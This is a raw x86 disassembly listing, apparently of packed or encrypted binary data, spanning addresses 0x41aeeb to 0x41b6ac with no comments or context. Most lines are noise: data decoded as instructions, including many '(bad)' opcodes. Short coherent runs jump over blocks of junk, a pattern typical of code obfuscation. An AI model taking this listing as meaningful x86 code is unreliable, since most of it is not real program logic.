  41aeeb:	stos   BYTE PTR es:[edi],al
  41aeec:	add    BYTE PTR [ebp+0x35],al
  41aeef:	mov    eax,0xcdf0c7a0
  41aef4:	cmp    esi,DWORD PTR [ecx-0x74c4d730]
  41aefa:	stos   BYTE PTR es:[edi],al
  41aefb:	fwait
  41aefc:	mov    esp,0xbe7170c9
  41af01:	call   0x5a5fa0c6
  41af06:	(bad)  [ecx+0x2b]
  41af09:	mov    dh,0x40
  41af0b:	mov    al,ds:0xecaf9696
  41af10:	and    eax,0xcb0bd8dc
  41af15:	mov    edx,0x37f9
  41af1a:	sub    edx,eax
  41af1c:	jmp    0x41afe9
  41af21:	mov    eax,ds:0xbf2c0c12
  41af26:	mov    eax,ds:0xd902fc9f
  41af2c:	jo     0x41af59
  41af2e:	xor    DWORD PTR [edx],esp
  41af30:	mov    esp,0x13729
  41af35:	mov    al,0x0
  41af37:	add    BYTE PTR [eax],al
  41af39:	inc    ecx
  41af3a:	mov    esp,0xbbcfcc10
  41af40:	(bad)  
  41af41:	test   ch,0x5b
  41af44:	mov    ebx,0x76e39cc6
  41af49:	ja     0x41afc0
  41af4b:	jp     0x41af7b
  41af4d:	dec    edi
  41af4e:	fwait
  41af4f:	dec    ecx
  41af50:	test   al,0x69
  41af52:	in     eax,dx
  41af53:	xor    dl,BYTE PTR [esi+0x38]
  41af56:	into   
  41af57:	mov    ah,0x51
  41af59:	(bad)  
  41af5a:	mov    edi,0xf449b40f
  41af5f:	int3   
  41af60:	inc    ebx
  41af61:	scas   al,BYTE PTR es:[edi]
  41af62:	and    edi,edx
  41af64:	mov    eax,0xaf233541
  41af69:	xchg   edi,eax
  41af6a:	push   edi
  41af6b:	mov    BYTE PTR [edx+0x161d82b0],ah
  41af71:	sub    BYTE PTR [edi+0x6e],bl
  41af74:	fwait
  41af75:	nop
  41af76:	or     ch,al
  41af78:	and    bh,cl
  41af7a:	repnz xor ah,ah
  41af7d:	sbb    cl,dh
  41af7f:	adc    eax,0x78cde4db
  41af84:	add    BYTE PTR [ebp+0x43],bl
  41af87:	inc    esp
  41af88:	jmp    0x41af18
  41af8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af8b:	sbb    cl,dh
  41af8d:	cmp    ch,BYTE PTR [edi]
  41af8f:	sub    al,0xce
  41af91:	stos   DWORD PTR es:[edi],eax
  41af92:	push   0xed2ac125
  41af97:	mov    ds:0x1a895083,eax
  41af9c:	or     BYTE PTR [eax+0x76b66a36],bl
  41afa2:	call   0xb0f2:0x4d426ec6
  41afa9:	dec    esi
  41afaa:	cmp    eax,0x442212c5
  41afaf:	add    eax,0x912577cb
  41afb4:	adc    eax,0xb49a26db
  41afb9:	push   edx
  41afba:	cld    
  41afbb:	mov    dl,BYTE PTR [esi]
  41afbd:	aam    0x73
  41afbf:	cmp    eax,DWORD PTR [eax]
  41afc1:	fdiv   DWORD PTR [ecx-0x18]
  41afc4:	push   ecx
  41afc5:	scas   al,BYTE PTR es:[edi]
  41afc6:	pusha  
  41afc7:	and    cl,ch
  41afc9:	xor    BYTE PTR [edx],0x26
  41afcc:	xchg   edi,esp
  41afce:	xor    al,0x63
  41afd0:	sub    al,0x6f
  41afd2:	mov    dl,0x1e
  41afd4:	mov    dh,0x1d
  41afd6:	aas    
  41afd7:	adc    BYTE PTR [ebx+0x24],0x5e
  41afdb:	pop    edx
  41afdc:	int3   
  41afdd:	inc    ecx
  41afde:	(bad)  
  41afdf:	push   cs
  41afe0:	lods   al,BYTE PTR ds:[esi]
  41afe1:	jns    0x41b026
  41afe3:	sub    ah,BYTE PTR [esi+0x24f6ffe7]
  41afe9:	mov    eax,DWORD PTR [ebp+0xc]
  41afec:	jmp    0x41b0b9
  41aff1:	clc    
  41aff2:	test   BYTE PTR [ebx+0x3d],dl
  41aff5:	jg     0x41aff6
  41aff7:	inc    ch
  41aff9:	push   ebp
  41affa:	dec    ebp
  41affb:	jae    0x41afff
  41affd:	push   0x5d
  41afff:	test   al,0xcd
  41b001:	fnstenv [edi]
  41b003:	add    DWORD PTR [eax],eax
  41b005:	mov    al,0x0
  41b007:	add    BYTE PTR [eax],al
  41b009:	xor    eax,0x8ee9c1d2
  41b00e:	cld    
  41b00f:	sub    cl,bh
  41b011:	push   edi
  41b012:	outs   dx,BYTE PTR ds:[esi]
  41b013:	sbb    ecx,edi
  41b015:	mov    dh,0xd9
  41b017:	mov    ch,0xbb
  41b019:	pusha  
  41b01a:	sub    eax,DWORD PTR [ebp+0x55b6c3ab]
  41b020:	int    0xb8
  41b022:	sub    BYTE PTR [eax-0x24],cl
  41b025:	rcr    DWORD PTR [eax+edx*4-0x48a3eb07],cl
  41b02c:	cmovne eax,DWORD PTR [ecx+0x44eee7a8]
  41b033:	aad    0x48
  41b035:	enter  0x2e9e,0x1f
  41b039:	mov    fs,ecx
  41b03b:	cmp    al,0xc0
  41b03d:	mov    al,ds:0x2101be78
  41b042:	sub    esp,DWORD PTR [ebp+0x47]
  41b045:	pop    ss
  41b046:	add    DWORD PTR [ecx-0x41ebd67e],ebp
  41b04c:	mov    BYTE PTR [ecx+0x29],dl
  41b04f:	adc    eax,0x58fce9f3
  41b054:	add    al,0x1a
  41b056:	dec    edx
  41b057:	idiv   esp
  41b059:	cld    
  41b05a:	mov    al,ds:0x9986c4c6
  41b05f:	fldenv [eax-0x2b]
  41b062:	push   ecx
  41b063:	adc    dh,BYTE PTR [eax+0x2621216d]
  41b069:	sbb    eax,0x6ef74891
  41b06e:	repnz dec eax
  41b070:	pushf  
  41b071:	push   ecx
  41b072:	das    
  41b073:	and    al,0x19
  41b075:	js     0x41b004
  41b077:	mov    edx,0xbcfc948d
  41b07c:	xchg   ebp,eax
  41b07d:	(bad)  [edi-0x78]
  41b080:	dec    ebp
  41b081:	(bad)  
  41b082:	dec    edx
  41b083:	mov    esi,DWORD PTR [edx+0x37c99079]
  41b089:	ins    BYTE PTR es:[edi],dx
  41b08a:	fistp  QWORD PTR [ebp+0x1a1196fb]
  41b090:	loope  0x41b0c1
  41b092:	loope  0x41b07c
  41b094:	mov    edx,0x8747a6d2
  41b099:	(bad)  
  41b09a:	or     al,0x93
  41b09c:	sar    DWORD PTR [eax],0xd6
  41b09f:	sub    cl,BYTE PTR [eax]
  41b0a1:	mov    ecx,ss
  41b0a3:	ffreep st(3)
  41b0a5:	mov    ah,dh
  41b0a7:	add    BYTE PTR ds:0x37a14c9a,ah
  41b0ad:	mov    al,ds:0xd981632e
  41b0b2:	dec    edx
  41b0b3:	out    0x6f,eax
  41b0b5:	cs loop 0x41b08a
  41b0b8:	in     al,0xbb
  41b0ba:	cld    
  41b0bb:	pop    ebx
  41b0bc:	add    BYTE PTR [eax],al
  41b0be:	sbb    ebx,ecx
  41b0c0:	add    edx,DWORD PTR [eax]
  41b0c2:	adc    ebx,DWORD PTR [eax+0x4]
  41b0c5:	jmp    0x41b192
  41b0ca:	jmp    0xeae7:0xda70def
  41b0d1:	out    dx,eax
  41b0d2:	jmp    0xa25e:0xa370c3d1
  41b0d9:	outs   dx,BYTE PTR ds:[esi]
  41b0da:	mov    DWORD PTR [eax],edi
  41b0dc:	add    DWORD PTR [eax],eax
  41b0de:	mov    al,0x0
  41b0e0:	add    BYTE PTR [eax],al
  41b0e2:	and    DWORD PTR [edi-0x7021f12b],ebx
  41b0e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0e9:	inc    eax
  41b0ea:	xor    ebx,DWORD PTR [ebx+0x23]
  41b0ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ee:	(bad)  
  41b0ef:	out    0x45,eax
  41b0f1:	(bad)  
  41b0f2:	mov    ebx,0x19d42383
  41b0f7:	cmp    cl,BYTE PTR es:[eax+esi*8+0x4be0ad3f]
  41b0ff:	mov    esp,0x9142fb06
  41b104:	ret    0x4b78
  41b107:	fdiv   DWORD PTR [edx]
  41b109:	mov    esp,ebp
  41b10b:	sub    ah,ch
  41b10d:	ins    DWORD PTR es:[edi],dx
  41b10e:	push   0xa59b6ac5
  41b113:	mov    bh,0x6
  41b115:	pop    edi
  41b116:	jns    0x41b12b
  41b118:	push   0xd2085507
  41b11d:	fcmovu st,st(3)
  41b11f:	enter  0xed96,0x7
  41b123:	mov    fs,WORD PTR [edx+0x23]
  41b126:	cmp    BYTE PTR [ebp+edi*1-0x20b9338f],dh
  41b12d:	pushf  
  41b12e:	push   cs
  41b12f:	imul   ebp
  41b131:	mov    dl,BYTE PTR [esi]
  41b133:	mov    ebx,0xd25ac7d6
  41b138:	mov    bl,BYTE PTR [edi]
  41b13a:	dec    eax
  41b13b:	popa   
  41b13c:	and    BYTE PTR [eax+edx*8],bl
  41b13f:	sub    BYTE PTR [esi-0x4ff605a8],ah
  41b145:	shl    BYTE PTR [esi],1
  41b147:	ret    0x2a23
  41b14a:	xor    esi,DWORD PTR [eax-0x40]
  41b14d:	add    bh,BYTE PTR [ebx+esi*2-0x497360ac]
  41b154:	(bad)  
  41b155:	fsubp  st(6),st
  41b157:	cdq    
  41b158:	xor    esi,edi
  41b15a:	retf   
  41b15b:	sub    eax,0x910685cb
  41b160:	jb     0x41b1e1
  41b162:	jbe    0x41b0e5
  41b164:	pop    ebx
  41b165:	ret    
  41b166:	std    
  41b167:	push   0xffffffdb
  41b169:	add    dl,BYTE PTR [ecx]
  41b16b:	inc    esp
  41b16c:	jg     0x41b139
  41b16e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b16f:	icebp  
  41b170:	add    DWORD PTR [edi],edx
  41b172:	pop    eax
  41b173:	push   0xc79ef8ed
  41b178:	push   edi
  41b179:	mov    ecx,0xfc1902a2
  41b17e:	loopne 0x41b1e0
  41b180:	jae    0x41b102
  41b182:	repnz mov edx,DWORD PTR [ebp+0x7f]
  41b186:	(bad)  
  41b187:	inc    esp
  41b188:	sub    BYTE PTR [ebx],al
  41b18a:	dec    eax
  41b18b:	int    0xe1
  41b18d:	packuswb mm6,QWORD PTR [ebx+esi*2+0x33d7337d]
  41b195:	fsubp  st(1),st
  41b197:	enter  0x0,0x0
  41b19b:	mov    cl,al
  41b19d:	sbb    al,0x88
  41b19f:	pop    esi
  41b1a0:	fcomp  QWORD PTR [esi+0x223a65ca]
  41b1a6:	mov    esp,0xdeb41cba
  41b1ab:	cmp    DWORD PTR [ecx],edi
  41b1ad:	add    DWORD PTR [eax],eax
  41b1af:	mov    al,0x0
  41b1b1:	add    BYTE PTR [eax],al
  41b1b3:	adc    eax,0xc9df8a3
  41b1b8:	fcom   QWORD PTR [eax]
  41b1ba:	jg     0x41b1b9
  41b1bc:	or     edi,esi
  41b1be:	sub    al,0x1c
  41b1c0:	pop    esi
  41b1c1:	rol    DWORD PTR [ebp+0x7d],0x16
  41b1c5:	dec    edi
  41b1c6:	jge    0x41b14f
  41b1c8:	shr    dl,1
  41b1ca:	jo     0x41b160
  41b1cc:	cwde   
  41b1cd:	loopne 0x41b20c
  41b1cf:	jno    0x41b1d8
  41b1d1:	lea    ebx,[esi+0x5a46343e]
  41b1d7:	sti    
  41b1d8:	push   esp
  41b1d9:	lock clc 
  41b1db:	push   ebx
  41b1dc:	dec    esi
  41b1dd:	rcr    ebp,cl
  41b1df:	lods   al,BYTE PTR ds:[esi]
  41b1e0:	out    dx,eax
  41b1e1:	neg    DWORD PTR [edi-0x4f943416]
  41b1e7:	jge    0x41b25d
  41b1e9:	or     ebp,DWORD PTR [eax+0x53]
  41b1ec:	push   cs
  41b1ed:	pop    ecx
  41b1ee:	xchg   edx,eax
  41b1ef:	mov    dh,0x52
  41b1f1:	pop    edx
  41b1f2:	fimul  WORD PTR [ebx+ecx*4+0x61]
  41b1f6:	call   0x7d8c:0x2d324f0d
  41b1fd:	bound  eax,QWORD PTR [eax]
  41b1ff:	repnz dec ebp
  41b201:	or     DWORD PTR [edi],ebp
  41b203:	in     eax,dx
  41b204:	lea    ecx,[esi-0x4f]
  41b207:	pop    ds
  41b208:	aas    
  41b209:	sub    BYTE PTR [edx],cl
  41b20b:	xor    eax,0xb14c7170
  41b210:	fnstcw WORD PTR [ecx+0x6d94e323]
  41b216:	pop    esi
  41b217:	or     eax,DWORD PTR [ebp-0x2bd76b48]
  41b21d:	dec    esp
  41b21e:	loope  0x41b237
  41b220:	pop    es
  41b221:	and    eax,0x988eb12f
  41b226:	(bad)  
  41b227:	call   0xe04db5f4
  41b22c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41b22e:	ret    0xf27e
  41b231:	leave  
  41b232:	addr16 inc ebp
  41b234:	int    0xa9
  41b236:	aas    
  41b237:	dec    edi
  41b238:	or     al,0x62
  41b23a:	add    ah,BYTE PTR [ebx-0x35217981]
  41b240:	sub    al,0x31
  41b242:	daa    
  41b243:	cld    
  41b244:	push   edx
  41b245:	inc    esp
  41b246:	mov    esp,0xbf4204e5
  41b24b:	jno    0x41b243
  41b24d:	jge    0x41b289
  41b24f:	leave  
  41b250:	sbb    al,0xe2
  41b252:	cli    
  41b253:	push   ebp
  41b254:	xchg   esi,eax
  41b255:	sub    DWORD PTR [esi+0x7780c0c6],edi
  41b25b:	mov    DWORD PTR ss:[ecx],edx
  41b25e:	cmp    eax,0x67b414b8
  41b263:	add    edx,0x99b8624d
  41b269:	mov    DWORD PTR [ebp-0x48],edx
  41b26c:	adc    ebx,0x8ddc
  41b272:	mov    DWORD PTR [ebp-0x44],ebx
  41b275:	mov    eax,DWORD PTR [ebp-0x50]
  41b278:	mov    ecx,DWORD PTR [ebp-0x4c]
  41b27b:	mov    edx,DWORD PTR [ebp-0x58]
  41b27e:	mov    esi,DWORD PTR [ebp-0x54]
  41b281:	and    eax,edx
  41b283:	jmp    0x41b350
  41b288:	ss mov eax,0xfbdfda53
  41b28e:	mov    edi,0xf80208fc
  41b293:	ficom  WORD PTR [esi-0x165bcc45]
  41b299:	cmp    DWORD PTR [ecx],eax
  41b29b:	add    BYTE PTR [eax+0x7000000],dh
  41b2a1:	loop   0x41b2f8
  41b2a3:	ds pop ds
  41b2a5:	arpl   sp,cx
  41b2a7:	stc    
  41b2a8:	sub    eax,0x8cbdac70
  41b2ad:	xchg   edx,eax
  41b2ae:	cs popf 
  41b2b0:	fs jno 0x41b294
  41b2b3:	pop    ds
  41b2b4:	add    al,0xa0
  41b2b6:	pop    eax
  41b2b7:	int    0x3a
  41b2b9:	aaa    
  41b2ba:	mov    dh,BYTE PTR [edi+0x4adb2a16]
  41b2c0:	retf   
  41b2c1:	pop    ebp
  41b2c2:	jmp    0x7927076f
  41b2c7:	mov    bl,0xc2
  41b2c9:	adc    eax,0xee9d0a76
  41b2ce:	(bad)  
  41b2cf:	(bad)  
  41b2d1:	ret    0x3398
  41b2d4:	cmp    DWORD PTR [esi-0xe],0x68
  41b2d8:	test   al,0x49
  41b2da:	call   0x5b586f8b
  41b2df:	cmp    edi,DWORD PTR [eax-0x73]
  41b2e2:	dec    ebp
  41b2e3:	ret    
  41b2e4:	and    dh,dl
  41b2e6:	clc    
  41b2e7:	sbb    bh,BYTE PTR [eax]
  41b2e9:	push   cs
  41b2ea:	js     0x41b346
  41b2ec:	pop    ecx
  41b2ed:	sub    eax,0x40e333da
  41b2f2:	test   edi,esp
  41b2f4:	(bad)
  41b2f7:	int    0x74
  41b2f9:	imul   ebp,DWORD PTR [eax+0x3d],0x5
  41b2fd:	and    dl,BYTE PTR [edi+0x72]
  41b300:	or     cl,cl
  41b302:	cmc    
  41b303:	mov    cl,0xae
  41b305:	ret    0xd162
  41b308:	push   es
  41b309:	jmp    0xfe6b:0x14a8abef
  41b310:	call   0xae89:0x83e86b10
  41b317:	dec    eax
  41b318:	pop    esi
  41b319:	jns    0x41b2ed
  41b31b:	mov    esp,0x8d6bed78
  41b320:	das    
  41b321:	cwde   
  41b322:	imul   edx,DWORD PTR [esi+0x7c],0xffffffd2
  41b326:	enter  0x586a,0xda
  41b32a:	push   es
  41b32b:	retf   
  41b32c:	div    DWORD PTR [ebp-0x58847856]
  41b332:	sbb    edx,esp
  41b334:	push   ecx
  41b335:	test   al,0x31
  41b337:	lds    edi,FWORD PTR [eax+0x49f2f9d3]
  41b33d:	push   esp
  41b33e:	dec    eax
  41b33f:	xchg   edi,eax
  41b340:	inc    edi
  41b341:	xchg   esp,eax
  41b342:	adc    ch,BYTE PTR fs:[esi+0x1b]
  41b346:	cs loopne 0x41b2df
  41b349:	mov    cl,0xf9
  41b34b:	jge    0x41b366
  41b34d:	xchg   DWORD PTR [edi+0x3e],edi
  41b350:	mov    edx,DWORD PTR [ebp-0x60]
  41b353:	and    ecx,esi
  41b355:	jmp    0x41b422
  41b35a:	pop    ss
  41b35b:	ins    DWORD PTR es:[edi],dx
  41b35c:	scas   al,BYTE PTR es:[edi]
  41b35d:	fdivp  st(6),st
  41b35f:	fbstp  TBYTE PTR [edi-0x13]
  41b362:	mov    al,ds:0xd6de2217
  41b367:	xchg   ebp,eax
  41b368:	sbb    esi,0xffffff99
  41b36b:	cmp    al,BYTE PTR [ecx]
  41b36d:	add    BYTE PTR [eax-0x79000000],dh
  41b373:	mov    al,0xa4
  41b375:	push   es
  41b376:	xor    dh,bh
  41b378:	fmul   st(2),st
  41b37a:	and    BYTE PTR [ecx+0x2cd69e7f],0xc3
  41b381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b382:	cs (bad) 
  41b384:	mov    esi,0x7ffeef42
  41b389:	and    ebx,DWORD PTR [edi]
  41b38b:	sub    dl,BYTE PTR [eax+edi*2+0x2750e58d]
  41b392:	or     bl,al
  41b394:	iret   
  41b395:	test   BYTE PTR [edi],ah
  41b397:	ja     0x41b354
  41b399:	je     0x41b3ef
  41b39b:	xor    eax,0xe897675f
  41b3a0:	mov    bh,0x74
  41b3a2:	mov    ecx,0x5a6b6a1a
  41b3a7:	sbb    al,0xc3
  41b3a9:	dec    ebp
  41b3aa:	dec    BYTE PTR [edx+0x34985887]
  41b3b0:	hlt    
  41b3b1:	gs in  al,0x9
  41b3b4:	dec    edi
  41b3b5:	in     al,0x6b
  41b3b7:	push   cs
  41b3b8:	scas   eax,DWORD PTR es:[edi]
  41b3b9:	in     al,0x84
  41b3bb:	add    DWORD PTR [eax+esi*2-0x47],ebp
  41b3bf:	(bad)
  41b3c2:	pop    ebx
  41b3c3:	inc    ebp
  41b3c4:	lds    edx,FWORD PTR [esi+esi*8-0x55]
  41b3c8:	mov    ds:0x778d63e8,al
  41b3cd:	jl     0x41b40a
  41b3cf:	out    0xd4,al
  41b3d1:	mov    eax,0xff311e9e
  41b3d6:	cmp    DWORD PTR [ecx],esp
  41b3d8:	in     eax,dx
  41b3d9:	dec    edi
  41b3da:	fisttp DWORD PTR [edx]
  41b3dc:	inc    ebp
  41b3dd:	add    eax,0xb62976b0
  41b3e2:	sbb    eax,0x9ff9ea04
  41b3e7:	shl    BYTE PTR [esi-0x20],0x5b
  41b3eb:	push   edx
  41b3ec:	xor    al,0x41
  41b3ee:	push   cs
  41b3ef:	mov    BYTE PTR [ebp-0x6d],0x7a
  41b3f3:	dec    esp
  41b3f4:	fnstcw WORD PTR [edi]
  41b3f6:	jle    0x41b39b
  41b3f8:	fscale 
  41b3fa:	es mov ecx,0x6a991db6
  41b400:	xchg   edx,eax
  41b401:	fcomp  st(3)
  41b403:	add    al,0x7e
  41b405:	mov    ch,0xaa
  41b407:	cmc    
  41b408:	sub    bh,dl
  41b40a:	mov    dh,0x1a
  41b40c:	adc    esp,esp
  41b40e:	inc    ecx
  41b40f:	push   esp
  41b410:	push   cs
  41b411:	push   esp
  41b412:	mov    dl,0xf5
  41b414:	pop    ds
  41b415:	dec    edx
  41b416:	cs add ebx,edi
  41b419:	(bad)  
  41b41a:	retf   
  41b41b:	push   edi
  41b41c:	adc    ah,BYTE PTR ss:[ebp+0x2e]
  41b420:	jns    0x41b484
  41b422:	mov    esi,DWORD PTR [ebp-0x5c]
  41b425:	push   esi
  41b426:	push   edx
  41b427:	push   ecx
  41b428:	push   eax
  41b429:	call   0x423dad
  41b42e:	mov    ecx,eax
  41b430:	mov    eax,DWORD PTR [ebp-0x68]
  41b433:	mov    esi,DWORD PTR [ebp-0x64]
  41b436:	jmp    0x41b503
  41b43b:	sub    al,0x97
  41b43d:	mov    cl,0x45
  41b43f:	mov    ebx,0x19fffc67
  41b444:	aad    0x92
  41b446:	int    0xec
  41b448:	pop    ss
  41b449:	jmp    0x41b417
  41b44b:	dec    ecx
  41b44c:	cmp    eax,DWORD PTR [ecx]
  41b44e:	add    BYTE PTR [eax+0x22000000],dh
  41b454:	leave  
  41b455:	stos   BYTE PTR es:[edi],al
  41b456:	stos   BYTE PTR es:[edi],al
  41b457:	inc    eax
  41b458:	push   es
  41b459:	inc    ecx
  41b45a:	loopne 0x41b4ac
  41b45c:	fsubr  QWORD PTR [ecx-0x17]
  41b45f:	call   0x73b4:0x16977c9f
  41b466:	mov    ds:0x23ba8933,eax
  41b46b:	aad    0xc6
  41b46d:	mov    eax,ds:0xd24ddabd
  41b472:	pop    esi
  41b473:	retf   0xb1b9
  41b476:	fstp   DWORD PTR [ebp-0x56]
  41b479:	in     al,dx
  41b47a:	scas   al,BYTE PTR es:[edi]
  41b47b:	jns    0x41b494
  41b47d:	cmp    DWORD PTR [eax+0x4c17a4c5],ebp
  41b483:	addr16 xchg ebx,eax
  41b485:	retf   
  41b486:	in     al,dx
  41b487:	out    0xa8,al
  41b489:	xchg   ecx,eax
  41b48a:	ins    DWORD PTR es:[edi],dx
  41b48b:	mov    esi,0xbf8f8ac5
  41b490:	icebp  
  41b491:	mov    edx,DWORD PTR [ebx-0x21bd5c7]
  41b497:	fisub  WORD PTR [ebp-0x48]
  41b49a:	cmp    edx,DWORD PTR [ebp-0x36]
  41b49d:	(bad)
  41b4a0:	jle    0x41b4a3
  41b4a2:	push   edi
  41b4a3:	xor    bl,dl
  41b4a5:	js     0x41b523
  41b4a7:	ins    BYTE PTR es:[edi],dx
  41b4a8:	outs   dx,DWORD PTR ds:[esi]
  41b4a9:	rcl    BYTE PTR [edi],cl
  41b4ab:	pushf  
  41b4ac:	ds mov esp,0xd3b331c4
  41b4b2:	movaps xmm3,xmm1
  41b4b5:	in     eax,0x93
  41b4b7:	shr    edi,0x49
  41b4ba:	adc    eax,0x1f2cbaf5
  41b4bf:	pop    ebp
  41b4c0:	test   BYTE PTR [esi+0x4bdae33],al
  41b4c6:	push   es
  41b4c7:	xchg   ecx,eax
  41b4c8:	or     ebp,DWORD PTR [eax+0x8]
  41b4cb:	ret    0x4633
  41b4ce:	mov    ebx,0xad863c0e
  41b4d3:	xlat   BYTE PTR ds:[ebx]
  41b4d4:	popa   
  41b4d5:	vmwrite esp,DWORD PTR [edi-0x13]
  41b4d9:	aas    
  41b4da:	jnp    0x41b506
  41b4dc:	mov    esp,0x831364e0
  41b4e1:	(bad)  
  41b4e2:	iret   
  41b4e3:	adc    edx,DWORD PTR [edi+edi*4]
  41b4e6:	lock outs dx,DWORD PTR ds:[esi]
  41b4e8:	inc    eax
  41b4e9:	sbb    ecx,DWORD PTR [ecx+ebx*1-0x55]
  41b4ed:	or     ecx,DWORD PTR [edi]
  41b4ef:	inc    edx
  41b4f0:	xor    dl,BYTE PTR [eax]
  41b4f2:	adc    BYTE PTR [ebp-0x80],al
  41b4f5:	mov    WORD PTR [ebx+0xee20aa4],cs
  41b4fb:	std    
  41b4fc:	je     0x41b47e
  41b4fe:	cld    
  41b4ff:	mov    al,ch
  41b501:	inc    esp
  41b502:	mov    WORD PTR [ecx+0x44d9e1],es
  41b508:	add    BYTE PTR [ecx+0x26bfe2],al
  41b50e:	add    BYTE PTR [ebx],cl
  41b510:	enter  0x458b,0xb8
  41b514:	or     edx,esi
  41b516:	mov    esi,DWORD PTR [ebp-0x44]
  41b519:	jmp    0x41b5e6
  41b51e:	lahf   
  41b51f:	sub    DWORD PTR [edi],ebp
  41b521:	test   BYTE PTR [edi-0x3cc4407a],bh
  41b527:	xor    edx,eax
  41b529:	dec    esi
  41b52a:	mov    edi,0xf95968cc
  41b52f:	cmp    eax,DWORD PTR [ecx]
  41b531:	add    BYTE PTR [eax+0x25000000],dh
  41b537:	xor    al,0xc1
  41b539:	mov    bh,0xe8
  41b53b:	cld    
  41b53c:	jp     0x41b5b4
  41b53e:	adc    BYTE PTR [edi+0x14],0x71
  41b542:	jo     0x41b529
  41b544:	ins    BYTE PTR es:[edi],dx
  41b545:	mov    DWORD PTR [esi],edi
  41b547:	lock in eax,dx
  41b549:	sbb    al,0xe6
  41b54b:	jp     0x41b536
  41b54d:	dec    ecx
  41b54e:	(bad)  
  41b54f:	fcomp  DWORD PTR [edx]
  41b551:	pop    edi
  41b552:	mov    ecx,0x34dd9df0
  41b557:	leave  
  41b558:	out    0xec,al
  41b55a:	push   eax
  41b55b:	out    dx,al
  41b55c:	or     DWORD PTR [edx-0x65aa437f],0x438ac034
  41b566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b567:	xchg   esi,eax
  41b568:	jo     0x41b5b4
  41b56a:	adc    esp,DWORD PTR gs:[eax-0x7e518f01]
  41b571:	out    0x48,eax
  41b573:	inc    ebp
  41b574:	pop    ss
  41b575:	test   al,0x1a
  41b577:	xor    bl,bh
  41b579:	sbb    DWORD PTR [eax],ebx
  41b57b:	add    al,dh
  41b57d:	mov    ecx,0x9a32839c
  41b582:	dec    esi
  41b583:	aaa    
  41b584:	fnstcw WORD PTR [eax+0xf38b90]
  41b58a:	mov    al,ds:0x60293f44
  41b58f:	test   DWORD PTR [ecx-0x54],edx
  41b592:	aad    0xb
  41b594:	test   al,0x97
  41b596:	lahf   
  41b597:	or     al,0x4a
  41b599:	sahf   
  41b59a:	leave  
  41b59b:	sbb    DWORD PTR [ebp+0x53],ecx
  41b59e:	xchg   DWORD PTR [edx-0x6cfe10ab],ebx
  41b5a4:	ret    0x16ea
  41b5a7:	jne    0x41b575
  41b5a9:	add    BYTE PTR [eax-0xd330253],bh
  41b5af:	xor    cl,BYTE PTR [ebx+0x57]
  41b5b2:	dec    ebp
  41b5b3:	push   ecx
  41b5b4:	jl     0x41b632
  41b5b6:	and    eax,0x52cecdd
  41b5bb:	pop    eax
  41b5bc:	xor    ch,BYTE PTR [ebx+0x17219b7d]
  41b5c2:	xchg   ebx,eax
  41b5c3:	das    
  41b5c4:	call   0x81579689
  41b5c9:	call   0x748b68e5
  41b5ce:	jmp    0x41b643
  41b5d0:	pop    eax
  41b5d1:	daa    
  41b5d2:	adc    al,0x30
  41b5d4:	push   es
  41b5d5:	mov    ecx,0xff3b9205
  41b5da:	leave  
  41b5db:	int    0xcd
  41b5dd:	dec    esi
  41b5de:	ins    BYTE PTR es:[edi],dx
  41b5df:	shl    esp,1
  41b5e1:	cdq    
  41b5e2:	sub    ah,BYTE PTR [ebx-0x4b]
  41b5e5:	mov    WORD PTR [ecx+0x7edef1],es
  41b5eb:	add    BYTE PTR [ecx+0x7662f2],al
  41b5f1:	add    BYTE PTR [ebx],al
  41b5f3:	enter  0x458b,0x8
  41b5f7:	pop    edi
  41b5f8:	jmp    0x41b6c5
  41b5fd:	adc    al,0x45
  41b5ff:	fstp   DWORD PTR [eax-0x27]
  41b602:	fcom   QWORD PTR [ebp-0x58c388b3]
  41b608:	jp     0x41b606
  41b60a:	dec    edx
  41b60b:	lock mov ebx,0x13ca9
  41b611:	mov    al,0x0
  41b613:	add    BYTE PTR [eax],al
  41b615:	push   ecx
  41b616:	lods   al,BYTE PTR ds:[esi]
  41b617:	xor    ecx,DWORD PTR es:[esp+edx*1]
  41b61b:	add    al,0xe7
  41b61d:	push   ebp
  41b61e:	pop    ebp
  41b61f:	inc    al
  41b621:	cwde   
  41b622:	sbb    ebx,DWORD PTR [ecx+0x20]
  41b625:	jl     0x41b613
  41b627:	(bad)  
  41b628:	fisub  DWORD PTR [edx+0x8]
  41b62b:	xor    al,0xbd
  41b62d:	pop    esp
  41b62e:	sub    DWORD PTR [ebx],0xffffffc7
  41b631:	and    al,bl
  41b633:	mov    dl,0xa2
  41b635:	cwde   
  41b636:	loopne 0x41b66f
  41b638:	cmc    
  41b639:	mov    dl,0x72
  41b63b:	adc    cl,BYTE PTR [eax-0x4d]
  41b63e:	jmp    0x8964506f
  41b643:	sbb    ah,al
  41b645:	ret    
  41b646:	inc    ebp
  41b647:	ret    
  41b648:	jne    0x41b6b2
  41b64a:	jae    0x41b5d0
  41b64c:	mov    ebp,DWORD PTR [eax-0x35ef3056]
  41b652:	int3   
  41b653:	mov    ch,ah
  41b655:	mov    WORD PTR [esi-0x73],ss
  41b658:	mov    edi,0x343aee05
  41b65d:	mov    edi,DWORD PTR [ecx+0xc4a3f37]
  41b663:	or     BYTE PTR [ecx-0x5587a20c],al
  41b669:	data16 jb 0x41b619
  41b66c:	jmp    0x21a:0xba58707d
  41b673:	dec    ecx
  41b674:	int    0x30
  41b676:	ret    0x740b
  41b679:	sbb    eax,0x474f19f6
  41b67e:	jp     0x41b6f6
  41b680:	ins    DWORD PTR es:[edi],dx
  41b681:	bound  ecx,QWORD PTR [ebp-0x63]
  41b684:	cld    
  41b685:	mov    edi,0xc44e3fb
  41b68a:	imul   ebx,DWORD PTR ds:0x4f73b6b3,0x152c024b
  41b694:	pusha  
  41b695:	pop    es
  41b696:	ficomp WORD PTR [esi+0x17]
  41b699:	pop    ebp
  41b69a:	dec    ecx
  41b69b:	inc    edx
  41b69c:	mov    al,0x1f
  41b69e:	jge    0x41b6a6
  41b6a0:	ret    
  41b6a1:	test   BYTE PTR [ebx+0x12e65fd4],bl
  41b6a7:	(bad)  
  41b6a8:	cmp    al,0xf6
  41b6aa:	jne    0x41b703
  41b6ac:	sbb    eax,0x7a
